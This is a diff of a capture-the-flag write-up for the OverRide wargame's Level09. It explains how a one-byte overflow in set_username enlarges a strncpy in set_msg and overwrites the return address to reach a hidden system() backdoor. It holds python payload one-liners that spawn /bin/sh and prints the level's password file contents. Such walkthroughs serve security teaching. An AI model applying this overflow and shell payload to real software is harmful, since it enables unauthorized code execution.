@@ -1,72 +1,36 @@
->info func
-0x000055555555488c  secret_backdoor    //не вызывается 
-0x00005555555548c0  handle_msg
-0x0000555555554932  set_msg
-0x00005555555549cd  set_username
-0x0000555555554aa8  main
+Level09
 
-disas secret_backdoor
-    вызывается system, причем с параметром из fgets 
-        0x00005555555548a1 <+21>:	lea    -0x80(%rbp),%rax
-        0x00005555555548a5 <+25>:	mov    $0x80,%esi
-        0x00005555555548aa <+30>:	mov    %rax,%rdi
-        0x00005555555548ad <+33>:	callq  0x555555554770 <fgets@plt>
-        0x00005555555548b2 <+38>:	lea    -0x80(%rbp),%rax
-        0x00005555555548b6 <+42>:	mov    %rax,%rdi
-        0x00005555555548b9 <+45>:	callq  0x555555554740 <system@plt>
+Running this binary gives us a username and message prompts, both using fgets(). After disassembling we notice a secret_backdoor() function that will run any system command we provide but it is not part of he execution flow. From this we can assume we will have to overwrite an EIP save and redirect to it.
 
-хотим переписать адрес возврата, чтобы перейти на secret_backdoor для handle_msg
-1.
-    считаем адрес возврата
-    Dump of assembler code for function handle_msg:
-    => 0x00005555555548c0 <+0>:	push   %rbp
-    0x00005555555548c1 <+1>:	mov    %rsp,%rbp
-    0x00005555555548c4 <+4>:	sub    $0xc0,%rsp
-    0x00005555555548cb <+11>:	lea    -0xc0(%rbp),%rax     
+The strings received by the program for the username and message prompts are handled by set_username() and set_msg() functions respectively and are then stored inside the following structure:
 
-    0xc0+8 = 200   
+typedef struct s_message
+{
+    char text[140];		// message destination
+    char username[40];		// username destination
+    int len;			// 140
+} t_message;
 
+Both functions use local buffers to store each result of fgets() before copying it into the main structure. They use two different methods to make this copy:
 
-2. Как можем это сделать? есть 2 fgets:
-    - в set_username
-        здесь записываем 41 байт с адреса STRUCT + 0x8c
-        и можем перезаписать    STRUCT + 0xb4  // 0xb4 = 0x8c+41
+    set_msg() uses strncpy() and the s_message->len as size parameter.
+    set_username() copies the characters one by one from the local buffer to s_message->username using a loop and index.
 
-    - в set_msg
-        записываем в STRUCT с помощью strncpy min (STRUCT + 0xb4, 0x400) символов
-        Здесь и будем перезаписывать адрес возврата handle_msg, вначале записав в пункте 1 большое STRUCT + 0xff
-        запись происходит на адрес 0x7fffffffe0b0:
-            b *0x000055555555499d
-                x/xw $rbp - 0x400
-                0x7fffffffe0b0:	0x00000000
+The copy loop in set_username() is repeated 41 times, this means we have a 1 byte overflow that allows us to overwrite the first (biggest) byte of s_message->len, and in turn change the size parameter for the strncpy() call in set_msg() to any value from 0 to 256.
 
-Чтобы дойти до адреса возврата 0x7fffffffe588 необходимо пройти от 0x7fffffffe0b0 число байт равное 
-                                                        0x7fffffffe588 - 0x7fffffffe0b0 = 0x4D8 = 1240
+If the EIP save is less than 248 bytes after our s_message->text buffer (this binary is 64 bit so we need 8 bytes to write the address) we can exploit this 1 byte overflow to take control of the execution flow.
 
+The buffer starts in rbp - 0xc0 (192) and there is a single push rbp (8), this means the EIP save is at buffer + (192 + 8).
 
-Итог:
-    в usernam пишем 'a'*40+0x000004D8[::-1]
-    в messege 'a'*200 + 0x000055555555488c[::-1]
-    затем в secret_backdoor подаем /bin/sh
+All that is left is to get the address for secret_backdoor() and write our command:
 
-(python -c "print 'A'*40 + '\xff' + '\n' + 'A' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n' + '/bin/sh'"; cat) | ./level09
-
+python -c "print 40 * 'a' + '\xd4' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'" > /tmp/inj09
+level09@OverRide:~$ cat /tmp/inj09 - | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
 >: Enter your username
->>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
 >>: >: Msg sent!
-ls
-ls: cannot open directory .: Permission denied
-whoami
-end
 cat /home/users/end/.pass
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
-                                                                                                        
-
-
-
-
-
-
